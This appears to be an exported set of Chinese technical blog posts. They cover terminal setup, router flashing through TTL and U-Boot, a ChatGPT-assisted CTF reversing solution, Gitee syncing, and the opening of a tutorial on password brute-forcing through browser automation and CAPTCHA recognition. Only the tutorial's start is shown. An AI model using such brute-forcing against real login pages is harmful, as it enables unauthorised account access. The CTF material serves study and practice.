<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd /k <span class="string">&quot;&quot;</span>%ConEmuDir%\..\init.bat<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-16-32-20.png"></p>
<p>我们打开自己喜欢的终端工具，比如<code>Windows Terminal</code>，打开一个CMD窗口粘贴上面的命令测试一下，如果没有报错成功运行，可以看到我们已经进入<code>Cmder</code>的环境了，刚才设置的<code>Alias</code>也生效了。如果报错的话，请检查一下你的系统环境变量设置。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-20-38.png"></p>
<h3 id="Windows-Terminal-Cmder"><a href="#Windows-Terminal-Cmder" class="headerlink" title="Windows Terminal + Cmder"></a>Windows Terminal + Cmder</h3><p>通过上面的方法我们知道可以使用第三方终端运行<code>Cmder</code>环境，下面来实践在<code>Windows Terminal</code>上面配置<code>Cmder</code>，只需要在设置中新建一个配置文件，照图片中配置即可：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-29-52.png"></p>
<p>注意：这种方法不能同步在<code>Cmder</code>上面设置的环境变量，即下面这种：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-26-57.png"></p>
<p>建议启用自动复制内容到剪切板：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-03-31-17-32-52.png"></p>
<p>其它如主题、背景图等等可以自己去设置一一设置。</p>
<h3 id="WinderTerm-Cmder"><a href="#WinderTerm-Cmder" class="headerlink" title="WinderTerm + Cmder"></a>WinderTerm + Cmder</h3><p>下载运行<code>WinderTerm</code>后，新建会话：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-35-45.png"></p>
<p>会话-&gt;Shell选择<code>cmd</code>：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-37-08.png"></p>
<p>在Shell-&gt;进程-&gt;参数填写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/k <span class="string">&quot;&quot;</span>%ConEmuDir%\..\init.bat<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>
<p>在工作目录填写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%CMDER_ROOT%</span><br></pre></td></tr></table></figure>
<p>环境变量可根据自己需求填写，效果跟系统的环境变量一样，只不过作用域只在<code>WinderTerm</code>的<code>Cmder</code>窗口，通过它我们可以配置轻松<code>NodeJs</code>、<code>Java</code>等环境变量。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-38-28.png"></p>
<p>效果如下：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-43-30.png"></p>
<p>最后，建议在会话-&gt;首选项-&gt;文本中开启自动复制文本，省得总是右键复制。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-49-18.png"></p>
<h3 id="WinderTerm-iPython"><a href="#WinderTerm-iPython" class="headerlink" title="WinderTerm + iPython"></a>WinderTerm + iPython</h3><p>这个跟<code>Cmder</code>一样原理，找到<code>ipython.exe</code>的路径，然后配置过去即可，这样平时调调代码就很方便。<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-09-44-34.png"></p>
<h3 id="WinderTerm-Linux-GUI"><a href="#WinderTerm-Linux-GUI" class="headerlink" title="WinderTerm + Linux GUI"></a>WinderTerm + Linux GUI</h3><p><code>WinderTerm</code>除了作为本地终端，<code>SSH</code>的支持也是我常用的功能。同时，可通过打开<code>X Server</code>功能，在<code>Windows</code>上打开通过<code>SSH</code>连接的<code>Linux GUI</code>程序。</p>
<p>在会话-&gt;首选项-&gt;X Server打开下图的设置：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-10-05-00.png"></p>
<p>效果如下：<br><img data-src="/2023/03/31/%E4%B8%AA%E4%BA%BA%E7%BB%88%E7%AB%AF%E7%8E%AF%E5%A2%83%E6%89%93%E9%80%A0/2023-04-03-10-10-42.png"></p>
<p>不过需要注意的是，如果<code>SSH</code>中断，<code>GUI</code>程序也会自动关闭。</p>
<!-- ### 小结
各人的使用习惯不一，希望 -->]]></content>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>兆能ZN-M2救砖记</title>
    <url>/2023/05/03/%E5%85%86%E8%83%BDZN-M2%E6%95%91%E7%A0%96%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>大概是自己做固件的时候忘了配置屏蔽WiFi，在更新ZN-M2的时候刷入了一个带WiFi的openwrt固件，好家伙，直接开机进不了后台，勉强能SSH登录但几乎无法操作，查看内存剩余4MB，想scp复制新的固件进去都会中断。然后进入不死uboot想重新刷，但是刷入任何固件均失败了，包括AX18和ZN-M2的，最终无奈进行TTL大法刷回原版固件。</p>
<p><img data-src="/2023/05/03/%E5%85%86%E8%83%BDZN-M2%E6%95%91%E7%A0%96%E8%AE%B0/2023-05-04-11-43-26.png"></p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先拆机、TTL接线，这些基操在之前的文章都说过了，可以参考：<a href="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/">小米CR8806免拆TTL刷机</a></p>
<p>TTL接线，老规矩：<br>RXD -&gt; TXD<br>GND -&gt; GND<br>TXD -&gt; RXD</p>
<p>插电后TTL开始滚屏，瞬间狂按esc进入命令行。</p>
<p>一开始刷入mtd17没有恢复成功，然后刷入mtd16恢复了。</p>
<p>可以用<code>smeminfo</code>看下分区表，mtd16是<code>rootfs</code>分区。</p>
<p>刷入和普通TTL刷机一样，直接把<code>mtd16</code>文件通过tftp传入路由器内存，然后写入闪存：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv ipaddr 192.168.1.1</span><br><span class="line">setenv serverip 192.168.1.10  <span class="comment"># tftp服务器地址</span></span><br><span class="line">tftpboot mtd16</span><br><span class="line">flash rootfs</span><br><span class="line">saveenv</span><br></pre></td></tr></table></figure>

<p>完了重启之后就能进入原版固件后台了。</p>
<p>最后，奉上一份<a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/ZN-M2/ZN-M2-MTD-BACKUP.7z">分区备份文件</a>。</p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>使用ChatGPT进行逆向的一次尝试</title>
    <url>/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近ChatGPT很火，笔者也进行了尝试，发现惊为天人，可谓颠覆性的产品。下面是通过ChatGPT进行一道简单的CTF逆向题的过程。</p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目选取了攻防世界的一道简单逆向，题目名称为”logmein”。</p>
<p>首先拖动文件到ida打开，代码如下：<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-20-38-12.png"></p>
<p>直接复制这部分代码发送给ChatGPT<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-20-55-47.png"></p>
<p>它会给你解释这段代码，这时候可以让它给你用python把代码写出来，便于理解<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-20-56-27.png"></p>
<p>它给出的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    v8 = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">    v7 = <span class="string">&quot;ebmarah&quot;</span></span><br><span class="line">    v6 = <span class="number">7</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;To continue, you must enter the correct password.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your guess: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    guess = <span class="built_in">input</span>()</span><br><span class="line">    v3 = <span class="built_in">len</span>(guess)</span><br><span class="line">    <span class="keyword">if</span> v3 &lt; <span class="built_in">len</span>(v8):</span><br><span class="line">        sub_4007C0(v8)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(guess)):</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(v8):</span><br><span class="line">            sub_4007C0()</span><br><span class="line">        <span class="keyword">if</span> guess[i] != <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[i % v6]) ^ <span class="built_in">ord</span>(v8[i])):</span><br><span class="line">            sub_4007C0()</span><br><span class="line">    sub_4007F0()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时可以帮它优化一下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4007C0</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_4007F0</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;correct&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    v8 = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">    v7 = <span class="string">&quot;ebmarah&quot;</span></span><br><span class="line">    v7 = v7[::-<span class="number">1</span>]</span><br><span class="line">    v6 = <span class="number">7</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;To continue, you must enter the correct password.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your guess: &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    guess = <span class="built_in">input</span>()</span><br><span class="line">    v3 = <span class="built_in">len</span>(guess)</span><br><span class="line">    <span class="keyword">if</span> v3 &lt; <span class="built_in">len</span>(v8):</span><br><span class="line">        sub_4007C0(v8)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(guess)):</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="built_in">len</span>(v8):</span><br><span class="line">            sub_4007C0()</span><br><span class="line">        <span class="keyword">if</span> guess[i] != <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[i % v6]) ^ <span class="built_in">ord</span>(v8[i])):</span><br><span class="line">            sub_4007C0()</span><br><span class="line">    sub_4007F0()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p>然后可以运行一下看看，能不能运行，手动测试能运行之后，告诉ChatGPT我给它修正了代码：<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-20-59-44.png"></p>
<p>接下来尝试引导它解出密码：<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-21-00-41.png"></p>
<p>尝试一段时间无果，遂让它给我写成解密代码：<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-21-01-25.png"></p>
<p>继续尝试让它运行代码，告诉我结果，然而并没有成功：<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-21-02-04.png"></p>
<p>但是，现在已经可以通过它给我写的解密代码，手动运行解出答案了！<br><img data-src="/2022/12/09/%E4%BD%BF%E7%94%A8ChatGPT%E8%BF%9B%E8%A1%8C%E9%80%86%E5%90%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/2022-12-09-21-03-05.png"></p>
<p>完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext: <span class="built_in">str</span>, key: <span class="built_in">str</span>, v7: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    v7 = v7[::-<span class="number">1</span>]</span><br><span class="line">    v6 = <span class="number">7</span></span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        plaintext += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v7[i % v6]) ^ <span class="built_in">ord</span>(key[i]))</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypt(<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>, <span class="string">&quot;ebmarah&quot;</span>))</span><br></pre></td></tr></table></figure>


<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>从本次尝试中可以看出ChatGPT强大的能力，本次实验选用了一道简单的逆向题目，同时也进行了一些人工干预，但是毫无疑问ChatGPT成功写出了逆向代码，这对于逆向新手来说是一个巨大的帮助，相信随着不断的探索，ChatGPT必然能发挥更大的作用。</p>
<p>最后，本文旨在讨论ChatGPT在逆向中的应用，请勿滥用AI影响比赛平衡。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>小米CR8806免拆TTL刷机</title>
    <url>/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近入手小米CR8806刷入集客固件做AP，这里记录一下免拆TTL刷机过程，以及一些踩坑的细节，希望能帮助到有缘人。<br>如果你也想刷机，那么建议你先看一遍参考中的b站视频再跟着我的教程走，小白慎入。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>在开始刷机前，需要先准备一个USB转TTL模块，这里用的是FT232，推荐。<br><a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/CR8806/CR8806_AP.7z">相关文件下载</a></p>
<h4 id="刷入官方固件"><a href="#刷入官方固件" class="headerlink" title="刷入官方固件"></a>刷入官方固件</h4><p>按照恩山教程，刷入官方固件恢复后才能进入TTL。（没尝试过不刷能不能进，有缘人看到这篇文章的话可以试试）。</p>
<p>网线插入路由器LAN1口，然后跟电脑处于同一局域网。<br>打开小米路由器修复工具选择固件：miwifi_cr8806_firmware_4622b_6.2.33.bin。<br>路由器断电，按住reset键，上电，直至黄灯闪烁后松开。<br>然后电脑就会自动识别到路由器开始刷入。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230417223332543.png"></p>
<p>要点：<br>路由器与电脑处于同一局域网就行，使用桥接网络的虚拟机也可以识别并刷机，但要留意网卡的ip是否有被设置到<code>192.168.31.x</code>，只有这样才能识别到路由器。</p>
<a id="more"></a>

<h4 id="TTL接线"><a href="#TTL接线" class="headerlink" title="TTL接线"></a>TTL接线</h4><p>刷入官方固件后路由器断电，在断电情况下完成TTL接线。<br>TTL这步最难的就是在不拆路由器的情况下，把TTL线接入到路由器的TTL口。TTL口在路由器主板左上方，对应的孔位如图。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/2023-04-20-12-27-32.png"><br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/2023-04-20-11-46-41.png"></p>
<p>TTL模块接线要如下图对应：<br>RXD -&gt; TXD<br>GND -&gt; GND<br>TXD -&gt; RXD<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230417235417703.png"></p>
<p>好了，知道怎么接线，难点来了。需要从路由器左上方的洞洞把TTL模块的连接线插入到路由器主板对应的TTL孔位。这里是用铁丝延长，把平时扎线的铁丝剥皮，然后剪断，一头插入杜邦线，一头插入TTL孔，然后用手机手电筒照着慢慢插到对应的孔位，有个技巧就是铁丝长点、直点会比较好插，插好之后用透明胶固定免得掉了。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230418005041216.png"></p>
<p>然后TTL模块插入电脑，通过设备管理器找到模块在哪个COM口，这里是<code>COM3</code>。使用终端工具连接，这里使用Xshell，波特率设置为<code>115200</code>，然后连接该COM口。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230417230108058.png"></p>
<p>然后接上路由器电源，终端开始输出字符，迅速按几下回车键，就可以进入shell。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230417235442033.png"></p>
<h4 id="刷入固件"><a href="#刷入固件" class="headerlink" title="刷入固件"></a>刷入固件</h4><p>输入以下3行命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv boot_wait on</span><br><span class="line">setenv uart_en 1</span><br><span class="line">saveenv</span><br></pre></td></tr></table></figure>
<p>此时重启就可以每次中断uboot进入命令行了。</p>
<p>把网线插入路由器LAN1口，然后跟电脑处于同一局域网，相连的电脑网卡ip设置为<code>192.168.31.100</code>。<br>然后在电脑启动一个TFTP服务，把ubi_JIKEAP_N3000.img拷贝进tftp32所在目录。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/2023-04-20-12-52-37.png"></p>
<p>然后在终端依次执行下发命令刷入集客固件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenv serverip 192.168.31.100</span><br><span class="line">tftpboot ubi-JIKEAP_N3000.img      <span class="comment">#将固件上传至路由器内存</span></span><br><span class="line">flash rootfs_1  <span class="comment">#将内存中的固件刷入rootfs_1分区</span></span><br><span class="line">setenv flag_try_sys2_failed 0   </span><br><span class="line">setenv flag_boot_rootfs 1</span><br><span class="line">setenv flag_last_success 1  <span class="comment">#上面3行应该是设置从rootfs_1分区启动，仍保留rootfs分区启动的能力</span></span><br><span class="line">saveenv  <span class="comment">#保存设置</span></span><br></pre></td></tr></table></figure>


<p><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230418000839135.png"><br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230418001103150.png"></p>
<p>完成后拔电重启，第一次开机要等一段时间，大概是几分钟，然后灯的颜色就会变，也可以在主路由器后台看到dhcp分配给它的地址。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230418002227530.png"><br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/image-20230418002419826.png"></p>
<p>然后在浏览器地址栏输入该ip打开集客固件后台，输入密码admin即可进入集客固件后台了。<br><img data-src="/2023/04/20/%E5%B0%8F%E7%B1%B3CR8806%E5%85%8D%E6%8B%86TTL%E5%88%B7%E6%9C%BA/2023-04-20-12-57-31.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.right.com.cn/FORUM/thread-8272321-1-1.html">https://www.right.com.cn/FORUM/thread-8272321-1-1.html</a><br><a href="https://www.bilibili.com/video/BV1h341197rX/">https://www.bilibili.com/video/BV1h341197rX/</a><br><a href="https://www.acwifi.net/20090.html">https://www.acwifi.net/20090.html</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>同步GitHub Page博客到Gitee</title>
    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
<a id="more"></a>
<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img data-src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>当SQL注入遇到诡异的编码问题</title>
    <url>/2019/09/12/%E5%BD%93SQL%E6%B3%A8%E5%85%A5%E9%81%87%E5%88%B0%E8%AF%A1%E5%BC%82%E7%9A%84%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>分享一个特殊的SQL注入案例，某处SQL注入因WEB系统数据库连接编码与实际的数据库编码不一致，并且数据库表字段名使用了中文的字段名，导致通过正常手段无法获取到数据库数据，文章已在Freebuf发布。<a href="https://www.freebuf.com/articles/web/213142.html">Freebuf原文</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title>基于浏览器的口令暴破与图形验证码识别</title>
    <url>/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>随着网络安全水平的发展，越来越多的网站增加了RSA加密、图形验证码等防护手段，传统的口令暴破方式已捉襟见肘，如果高效、低代码的进行口令暴破？本文将介绍一个操作浏览器进行口令暴破的案例与验证码识别工具。</p>
<h3 id="Playwright：浏览器自动化工具"><a href="#Playwright：浏览器自动化工具" class="headerlink" title="Playwright：浏览器自动化工具"></a>Playwright：浏览器自动化工具</h3><p>Playwright是一个强大的Python库，仅用一个API即可自动执行Chromium、Firefox、WebKit等主流浏览器自动化操作，并同时支持以无头模式、有头模式运行。相比传统的“selenium”等工具，他可以录制我们对浏览器的操作并自动生成脚本，同时代码也是非常简单，与我们高效工作的目标非常契合。</p>
<a id="more"></a>
<h3 id="Playwright：滑动验证码案例"><a href="#Playwright：滑动验证码案例" class="headerlink" title="Playwright：滑动验证码案例"></a>Playwright：滑动验证码案例</h3><h4 id="生成登录流程代码"><a href="#生成登录流程代码" class="headerlink" title="生成登录流程代码"></a>生成登录流程代码</h4><p>安装playwright后，运行下面命令进行录制浏览器操作，并生成代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m playwright codegen</span><br></pre></td></tr></table></figure>
<p><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-18-07-29.png"></p>
<p>输入目标URL并回车，可以看到自动生成了代码：<br><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-18-10-19.png"></p>
<p>输入账号、密码，点击验证码，然后点击登录。录制过程中并不能拖动滑块，所以无法生成滑块的代码，登录操作其余的大部分代码均已生成，也可以看到其代码是非常简单的：<br><img data-src="/2022/05/10/%E5%9F%BA%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%8F%A3%E4%BB%A4%E6%9A%B4%E7%A0%B4/2022-05-10-18-15-01.png"></p>
